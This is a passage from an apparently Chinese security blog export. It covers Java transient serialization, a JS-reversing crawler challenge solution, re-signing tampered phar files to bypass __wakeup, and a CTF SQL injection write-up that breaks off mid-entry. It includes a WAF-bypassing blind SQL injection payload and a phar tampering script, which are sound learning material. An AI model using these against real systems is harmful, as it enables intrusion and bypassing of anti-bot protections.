class="string">&#x27;\&#x27;&#x27;</span> + <span class="string">&quot;, height=&#x27;&quot;</span> + <span class="built_in">this</span>.height + <span class="string">&#x27;\&#x27;&#x27;</span> + <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="2-transient关键字的作用"><a href="#2-transient关键字的作用" class="headerlink" title="2.transient关键字的作用"></a>2.transient关键字的作用</h2><p>在java中，transient主要用来防止成员变量被反序列化。<br>使用语法如下<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@transient</span></span><br><span class="line"><span class="keyword">private</span> String var1;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">transient</span> String var2;</span><br></pre></td></tr></table></figure><br><code>@transient</code>用于hibernate entity class中，使用后就会忽略掉这个字段不会让这些变量写入数据库中</p>
<h2 id="3-让transient变量进入反序列化"><a href="#3-让transient变量进入反序列化" class="headerlink" title="3.让transient变量进入反序列化"></a>3.让transient变量进入反序列化</h2><p>用下面的代码来解释一下readObject和writeObject方法<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">  <span class="keyword">private</span> String firstName;</span><br><span class="line">  <span class="keyword">private</span> String lastName;</span><br><span class="line">  <span class="keyword">private</span> <span class="type">int</span> accountNumber;</span><br><span class="line">  <span class="keyword">private</span> Date dateOpened;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">public</span> <span class="title function_">User</span><span class="params">(String firstName, String lastName, <span class="type">int</span> accountNumber, Date dateOpened)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>();</span><br><span class="line">    <span class="built_in">this</span>.firstName = firstName;</span><br><span class="line">    <span class="built_in">this</span>.lastName = lastName;</span><br><span class="line">    <span class="built_in">this</span>.accountNumber = accountNumber;</span><br><span class="line">    <span class="built_in">this</span>.dateOpened = dateOpened;</span><br><span class="line">  &#125;</span><br><span class="line">   </span><br><span class="line">  <span class="keyword">public</span> <span class="title function_">User</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>();</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">//Setters and Getters</span></span><br><span class="line"> </span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream aInputStream)</span> <span class="keyword">throws</span> ClassNotFoundException, IOException </span><br><span class="line">  &#123;   </span><br><span class="line">    firstName = aInputStream.readUTF();</span><br><span class="line">    lastName = aInputStream.readUTF();</span><br><span class="line">    accountNumber = aInputStream.readInt();</span><br><span class="line">    dateOpened = <span class="keyword">new</span> <span class="title class_">Date</span>(aInputStream.readLong());</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeObject</span><span class="params">(ObjectOutputStream aOutputStream)</span> <span class="keyword">throws</span> IOException </span><br><span class="line">  &#123;</span><br><span class="line">    aOutputStream.writeUTF(firstName);</span><br><span class="line">    aOutputStream.writeUTF(lastName);</span><br><span class="line">    aOutputStream.writeInt(accountNumber);</span><br><span class="line">    aOutputStream.writeLong(dateOpened.getTime());</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>writeXXX由ObjectOutputStream提供，readXXX同理<br>读取和写入的顺序必须是一样的<br>序列化的时候会调用writeObject把其中的字段写入<br>反序列化的时候就会调用readObject，按写入顺序读取<br><br></p>
<p>那么在看回最开始的题目，显而易见，只需要在testC中这个类加入writeObject，在进行序列化就可以了<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">testC</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> String age;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">transient</span> String height;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">testC</span><span class="params">(String name, String age, String height)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">        <span class="built_in">this</span>.height = height;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(String age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getHeight</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.height;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setHeight</span><span class="params">(String height)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.height = height;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream s)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        s.defaultReadObject();</span><br><span class="line">        <span class="built_in">this</span>.height = (String)s.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object obj)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (obj == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">this</span> == obj) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> testC) &#123;</span><br><span class="line">            <span class="type">testC</span> <span class="variable">user</span> <span class="operator">=</span> (testC)obj;</span><br><span class="line">            <span class="keyword">return</span> user.getAge().equals(<span class="built_in">this</span>.age) &amp;&amp; user.getHeight().equals(<span class="built_in">this</span>.height) &amp;&amp; user.getName().equals(<span class="built_in">this</span>.name);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeObject</span><span class="params">(ObjectOutputStream s)</span> <span class="keyword">throws</span> IOException&#123;</span><br><span class="line">        s.defaultWriteObject();</span><br><span class="line">        s.writeObject(<span class="string">&quot;111&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;User&#123;name=&#x27;&quot;</span> + <span class="built_in">this</span>.name + <span class="string">&#x27;\&#x27;&#x27;</span> + <span class="string">&quot;, age=&#x27;&quot;</span> + <span class="built_in">this</span>.age + <span class="string">&#x27;\&#x27;&#x27;</span> + <span class="string">&quot;, height=&#x27;&quot;</span> + <span class="built_in">this</span>.height + <span class="string">&#x27;\&#x27;&#x27;</span> + <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><img src="/2022/08/02/java-transient%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1.jpg" alt></p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.delftstack.com/howto/java/transient-in-java/">https://www.delftstack.com/howto/java/transient-in-java/</a></p>
<p><a href="https://howtodoinjava.com/java/serialization/custom-serialization-readobject-writeobject/">https://howtodoinjava.com/java/serialization/custom-serialization-readobject-writeobject/</a></p>
]]></content>
      <categories>
        <category>代码审计</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>猿人学18题（jsvmp）</title>
    <url>/2022/06/09/%E7%8C%BF%E4%BA%BA%E5%AD%A618%E9%A2%98/</url>
    <content><![CDATA[<p>猿人学18题链接<br><a href="https://match.yuanrenxue.com/match/18">https://match.yuanrenxue.com/match/18</a><br><span id="more"></span></p>
<ul>
<li><h3 id="1-初步分析，找到加密点"><a href="#1-初步分析，找到加密点" class="headerlink" title="1.初步分析，找到加密点"></a>1.初步分析，找到加密点</h3><blockquote>
<p>要求爬取后几个数据<br> <img src="/2022/06/09/%E7%8C%BF%E4%BA%BA%E5%AD%A618%E9%A2%98/1.png" alt><br> 当点击4，5页面时会出现<br> <img src="/2022/06/09/%E7%8C%BF%E4%BA%BA%E5%AD%A618%E9%A2%98/2.png" alt><br> 此时抓包改ua<br> <img src="/2022/06/09/%E7%8C%BF%E4%BA%BA%E5%AD%A618%E9%A2%98/3.png" alt><br> 会显示如上界面，也就是必须要破解v参数，否则会触发风控系统<br><br> 那么对ajax请求进行栈跟踪，找到加密处<br> <img src="/2022/06/09/%E7%8C%BF%E4%BA%BA%E5%AD%A618%E9%A2%98/4.png" alt><br> 进入getdata，向前面的代码打上断点#<em>也就是xml.send()的前面</em><br> <strong>因为一般来说加密过程在发送数据包的前面</strong><br><br> <img src="/2022/06/09/%E7%8C%BF%E4%BA%BA%E5%AD%A618%E9%A2%98/5.png" alt><br> 由上图可以看出请求的page只有1，并没有v=后面的加密数据，所以推测加密算法在xml.open()后面，继续步进<br> <img src="/2022/06/09/%E7%8C%BF%E4%BA%BA%E5%AD%A618%E9%A2%98/6.png" alt><br> 可以看到这是混淆代码，所以应该就来到了加密处<font size="1" color="#0000FF">(firefox不知道为什么不能很好的格式化输出，只好用chrome了)</font><br> <img src="/2022/06/09/%E7%8C%BF%E4%BA%BA%E5%AD%A618%E9%A2%98/7.png" alt><br> 观察传入的四个参数，可以找到有一个是上图所示，不难看出是<strong>AES加密</strong>，且填充方式是<strong>pkcs7</strong><br><br> 那么就可以通过这点进行hook，观察加密参数是什么<br> 保持断点不动，切到console<br> <img src="/2022/06/09/%E7%8C%BF%E4%BA%BA%E5%AD%A618%E9%A2%98/8.png" alt><br> 当输入<code>_[1][0]</code>时可以看到加密相关的参数，我们需要的就是覆盖掉加密函数，这样就能保证每次他进行加密的时候可以知道加密了哪些参数</p>
</blockquote>
</li>
<li><h3 id="2-hook-AES加密，分析加密数据"><a href="#2-hook-AES加密，分析加密数据" class="headerlink" title="2.hook AES加密，分析加密数据"></a>2.hook AES加密，分析加密数据</h3><blockquote>
<p>继续上一步，到console，当我想定义变量的时候，出现以下错误<br> <img src="/2022/06/09/%E7%8C%BF%E4%BA%BA%E5%AD%A618%E9%A2%98/9.png" alt><br> 不知道是什么原因，思考良久以后发现只要在进入混淆代码之前就把变量定义出来就行，如下图<br> <img src="/2022/06/09/%E7%8C%BF%E4%BA%BA%E5%AD%A618%E9%A2%98/10.png" alt><br> 在这时候切到console界面，然后定义变量，到时候就用这个变量<br> <img src="/2022/06/09/%E7%8C%BF%E4%BA%BA%E5%AD%A618%E9%A2%98/11.png" alt><br> 回到调试器，继续步进，回到混淆代码处</p>
 <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">org_encrypto = _[<span class="number">1</span>][<span class="number">0</span>][<span class="string">&#x27;CryptoJS&#x27;</span>][<span class="string">&#x27;AES&#x27;</span>].<span class="property">encrypt</span>;</span><br><span class="line"></span><br><span class="line">_[<span class="number">1</span>][<span class="number">0</span>][<span class="string">&#x27;CryptoJS&#x27;</span>][<span class="string">&#x27;AES&#x27;</span>].<span class="property">encrypt</span> = <span class="keyword">function</span>(<span class="params">a,b,c,d,e</span>)&#123;</span><br><span class="line"><span class="keyword">debugger</span>;</span><br><span class="line"><span class="keyword">var</span> result = <span class="title function_">org_encrypto</span>(a,b,c,d,e);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(org_encrypto.<span class="title function_">toString</span>());</span><br><span class="line"><span class="keyword">return</span> result;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><img src="/2022/06/09/%E7%8C%BF%E4%BA%BA%E5%AD%A618%E9%A2%98/12.png" alt><br> 然后在控制台输入以上代码，进行hook操作<br> 接下来直接继续脚本执行<font size="1"><em>不用f11什么的步进</em></font><br> 当他进行加密操作的时候，会自动跳转到刚刚覆盖的函数encrypt<br> <img src="/2022/06/09/%E7%8C%BF%E4%BA%BA%E5%AD%A618%E9%A2%98/14.png" alt><br> 这时候就可以看到具体加密了什么参数了，到控制台输出一下<br> <img src="/2022/06/09/%E7%8C%BF%E4%BA%BA%E5%AD%A618%E9%A2%98/13.png" alt></p>
 <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">_[<span class="number">1</span>][<span class="number">0</span>][<span class="string">&#x27;CryptoJS&#x27;</span>].<span class="property">enc</span>.<span class="property">Utf8</span>.<span class="title function_">stringify</span>(a) <span class="comment">//text</span></span><br><span class="line">_[<span class="number">1</span>][<span class="number">0</span>][<span class="string">&#x27;CryptoJS&#x27;</span>].<span class="property">enc</span>.<span class="property">Utf8</span>.<span class="title function_">stringify</span>(b) <span class="comment">//key</span></span><br><span class="line">_[<span class="number">1</span>][<span class="number">0</span>][<span class="string">&#x27;CryptoJS&#x27;</span>].<span class="property">enc</span>.<span class="property">Utf8</span>.<span class="title function_">stringify</span>(c.<span class="property">iv</span>) <span class="comment">//iv</span></span><br></pre></td></tr></table></figure>
<p>那么接下来就是分析这些参数具体是怎么生成的了<br> 在调用栈里面回到上一个调用函数<br> <img src="/2022/06/09/%E7%8C%BF%E4%BA%BA%E5%AD%A618%E9%A2%98/15.png" alt><br> 那么在此添加日志断点，可以输出所有经过此函数的变量<br> <img src="/2022/06/09/%E7%8C%BF%E4%BA%BA%E5%AD%A618%E9%A2%98/16.png" alt><br> 这时候把其它断点都去掉，页面刷新一下把hook的函数也去掉，只留下日志断点<br> <img src="/2022/06/09/%E7%8C%BF%E4%BA%BA%E5%AD%A618%E9%A2%98/17.png" alt><br> 可以看到当鼠标移动的时候会在控制台输出以上信息，这时候点击第二页（第三页也行都一样）<br> 可以看到控制台输出了很多其它信息，往上翻找，找到第一次变化的地方<br> <img src="/2022/06/09/%E7%8C%BF%E4%BA%BA%E5%AD%A618%E9%A2%98/18.png" alt><br> <code>1654762249</code>第一个数据，很明显是时间戳<br> 后面跟了一个16，猜测是把时间戳进行16进制转换<br> 用计算器算了一下确实如此，结果为<code>62a1ab09</code>，然后再把结果进行拼接，变为了<code>62a1ab0962a1ab09</code><br> 而另一个数据就是把6个鼠标移动位置进行了拼接，然后前面2|就是当前页码，最后变为<code>2|704m205,702m205,701m205,701d205,701m205,701u205</code><br><br> 那么最后结果就一目了然了，text就是鼠标移动加页面的拼接，另外两个就是iv和key，在这里iv=key<br> 往下翻找到加密后的数据（当然在network那栏也可以找到）也就是v=<br> <img src="/2022/06/09/%E7%8C%BF%E4%BA%BA%E5%AD%A618%E9%A2%98/19.png" alt><br> 用上面的数据进行加密，看看结果是否符合<br> <img src="/2022/06/09/%E7%8C%BF%E4%BA%BA%E5%AD%A618%E9%A2%98/20.png" alt><br> 显然是符合的，有些不一样是因为被url编码了，那么具体加密也了解了，现在开始写python脚本了</p>
</blockquote>
</li>
<li><h3 id="3-脚本实现"><a href="#3-脚本实现" class="headerlink" title="3.脚本实现"></a>3.脚本实现</h3><blockquote>
<p>首先需要获取当前时间戳，并将其转换为16进制，再进行拼接</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">AESKEY = <span class="built_in">hex</span>(<span class="built_in">int</span>(time.time())).strip(<span class="string">&#x27;0x&#x27;</span>)+<span class="built_in">hex</span>(<span class="built_in">int</span>(time.time())).strip(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">AESIV = AESKEY</span><br></pre></td></tr></table></figure>
<p>然后是对鼠标位置的拼接，这里直接将上面的鼠标键位复制下来，后与第四页进行拼接<br> <code>text = &#39;4|704m205,702m205,701m205,701d205,701m205,701u205&#39;</code><br>然后在用AES加密</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">AESKEY = <span class="built_in">hex</span>(<span class="built_in">int</span>(time.time())).strip(<span class="string">&#x27;0x&#x27;</span>)+<span class="built_in">hex</span>(<span class="built_in">int</span>(time.time())).strip(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">AESIV = AESKEY</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AESTool</span>:</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">    self.key = AESKEY.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    self.iv = AESIV.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pkcs7padding</span>(<span class="params">self, text</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    明文使用PKCS7填充</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    bs = <span class="number">16</span></span><br><span class="line">    length = <span class="built_in">len</span>(text)</span><br><span class="line">    bytes_length = <span class="built_in">len</span>(text.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    padding_size = length <span class="keyword">if</span> (bytes_length == length) <span class="keyword">else</span> bytes_length</span><br><span class="line">    padding = bs - padding_size % bs</span><br><span class="line">    padding_text = <span class="built_in">chr</span>(padding) * padding</span><br><span class="line">    self.coding = <span class="built_in">chr</span>(padding)</span><br><span class="line">    <span class="keyword">return</span> text + padding_text</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aes_encrypt</span>(<span class="params">self, content</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    AES加密</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    cipher = AES.new(self.key, AES.MODE_CBC, self.iv)</span><br><span class="line">    <span class="comment"># 处理明文</span></span><br><span class="line">    content_padding = self.pkcs7padding(content)</span><br><span class="line">    <span class="comment"># 加密</span></span><br><span class="line">    encrypt_bytes = cipher.encrypt(content_padding.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    <span class="comment"># 重新编码</span></span><br><span class="line">    result = <span class="built_in">str</span>(base64.b64encode(encrypt_bytes), encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aes_decrypt</span>(<span class="params">self, content</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    AES解密</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    cipher = AES.new(self.key, AES.MODE_CBC, self.iv)</span><br><span class="line">    content = base64.b64decode(content)</span><br><span class="line">    text = cipher.decrypt(content).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> self.pkcs7padding(text)</span><br><span class="line">text = <span class="string">&#x27;2|704m205,702m205,701m205,701d205,701m205,701u205&#x27;</span></span><br><span class="line">v = aes_tool.aes_encrypt(text)</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;https://match.yuanrenxue.com/match/18data?page=2&amp;t=&#123;&#125;&amp;v=&#123;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>:<span class="string">&#x27;yuanrenxue.project&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">r = requests.get(url.<span class="built_in">format</span>(timestamp,v),data=data)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>
<p>由于我没有帐号，所以没有session_id，所以无法获取后两页，但是前两页是可以用python获取的，所以逻辑应该是没有问题的<br> <img src="/2022/06/09/%E7%8C%BF%E4%BA%BA%E5%AD%A618%E9%A2%98/21.png" alt></p>
</blockquote>
</li>
</ul>
]]></content>
      <categories>
        <category>js逆向</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>js逆向</tag>
        <tag>爬虫</tag>
      </tags>
  </entry>
  <entry>
    <title>phar signature</title>
    <url>/2022/07/06/phar-signature/</url>
    <content><![CDATA[<h2 id="1-前言"><a href="#1-前言" class="headerlink" title="1.前言"></a>1.前言</h2><p><em>脚本在最后</em></p>
<p>如果需要手动修改phar中的内容，直接修改，然后上传，php解析会报错<br><span id="more"></span><br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">EzTrick</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>=<span class="string">&quot;phpinfo();&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$waf</span>=<span class="string">&quot;123&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER();?&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$o</span> = <span class="keyword">new</span> <span class="title class_">EzTrick</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br></pre></td></tr></table></figure><br>比如如上代码<br>生成以后用hex editor打开<br><img src="/2022/07/06/phar-signature/1.jpg" alt><br>可以看到如上信息，如果我们去修改他的成员数，2改成3，去绕过__wakeup()，然后去上传<br><img src="/2022/07/06/phar-signature/2.jpg" alt><br>可以看到报错了，说是signature出错<br>那么这时候就要去了解phar文件中signature的形成了</p>
<h2 id="2-phar结构"><a href="#2-phar结构" class="headerlink" title="2.phar结构"></a>2.phar结构</h2><p><a href="https://www.php.net/manual/en/phar.fileformat.signature.php">https://www.php.net/manual/en/phar.fileformat.signature.php</a><br>官网有解释<br><img src="/2022/07/06/phar-signature/3.jpg" alt><br>大致意思就是signature是在文件内容的后端</p>
<p><a href="https://stackoverflow.com/questions/23592827/how-phar-signature-prevents-tampering-with-files">https://stackoverflow.com/questions/23592827/how-phar-signature-prevents-tampering-with-files</a><br>stackoverflow上面也有解释<br><img src="/2022/07/06/phar-signature/6.jpg" alt><br>那么意思就是用整个文件内容去进行加密<br>且默认是用sha1去加密，不过php8是默认用sha256加密</p>
<h2 id="3-生成signature"><a href="#3-生成signature" class="headerlink" title="3.生成signature"></a>3.生成signature</h2><p>那我们可以用php输出signature在比对一下十六进制文件，就可以知道具体位置了<br>在如上php代码末尾加上一段<code>var_dump($phar-&gt;getSignature());</code><br><img src="/2022/07/06/phar-signature/4.jpg" alt><br>在对比hex editor打开的<br><img src="/2022/07/06/phar-signature/5.jpg" alt><br>可以发现是在text后面32位，就是sha1加密<br>那么是用整个文件内容去加密，那应该就是用加密字符的前面内容去加密，我们可以用python去验证一下<br><img src="/2022/07/06/phar-signature/7.jpg" alt><br>可以看到与hash一样，那么我们可以写脚本，把修改以后的sha1替换了<br>由于后面的位数是一样的，那么脚本可以从后往前进行读取<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;phar.phar&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">c = f.read()</span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line">new_sha1 = hashlib.sha1(c[:-<span class="number">28</span>]).digest() <span class="comment">#获取新的sha1</span></span><br><span class="line"></span><br><span class="line">new = c[:-<span class="number">28</span>]+hashlib.sha1(c[:-<span class="number">28</span>]).digest()+c[-<span class="number">8</span>:]</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;phar_t.phar&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">f.write(new)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><br>sha1的加密脚本就可以这么实现<br><img src="/2022/07/06/phar-signature/8.jpg" alt><br>可以看到成功读取了</p>
]]></content>
      <categories>
        <category>代码审计</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
        <tag>php</tag>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>国赛初赛sql注入</title>
    <url>/2022/09/28/%E5%9B%BD%E8%B5%9B%E5%88%9D%E8%B5%9Bsql%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<h2 id="1-前言"><a href="#1-前言" class="headerlink" title="1.前言"></a>1.前言</h2><p>最近在疯狂恶补sql注入的知识，了解到国赛初赛有一道sql注入的题目，就去看了一下</p>
<h2 id="2-分析过滤"><a href="#2-分析过滤" class="headerlink" title="2.分析过滤"></a>2.分析过滤</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe</span>(<span class="params"><span class="variable">$a</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$r</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\s,()#;*~\-]/&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$a</span>);</span><br><span class="line">    <span class="variable">$r</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/^.*(?=union|binary|regexp|rlike).*$/i&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$r</span>);</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">string</span>)<span class="variable">$r</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>这是waf代码</p>
<ul>
<li>可以看到过滤了双括号，空格(\s),注释符号(/**/,#)</li>
<li>过滤了union 就不能进行联合查询</li>
<li>根据提示utf8mb4_bin是要进行大小写区分的</li>
</ul>
<h2 id="3-语句分析"><a href="#3-语句分析" class="headerlink" title="3.语句分析"></a>3.语句分析</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0&#x27;||case&#x27;1&#x27;when`password`collate&#x27;utf8mb4_bin&#x27;like&#x27;&#123;&#125;%&#x27;then+9223372036854775807+1+&#x27;&#x27;else&#x27;0&#x27;end||&#x27;</span><br></pre></td></tr></table></figure>
<ul>
<li><p>如果按正常的语句，一般是用if(condition,1,0)进行判断，但是这里过滤了()，那么就不能正常使用了，同理也不能用时间盲注去进行判断了，因为使用函数都需要用括号。<br>那么这里使用的是</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">case case_value</span><br><span class="line">    when condition then statement</span><br><span class="line">    when condition then statement</span><br><span class="line">    else statement</span><br><span class="line">end</span><br></pre></td></tr></table></figure>
</li>
<li><p>utf8mb4_bin<br>主要用于编码，让mysql可以支持4位的utf8编码，让字符变为二进制，然后开始对比。<br>一般配合collate进行使用，例如<br><code>select * from users where username collate utf8mb4_bin=&#39;admin&#39;</code><br>就会将列名username下的值和字符admin转为utf8mb4_bin进行对比</p>
</li>
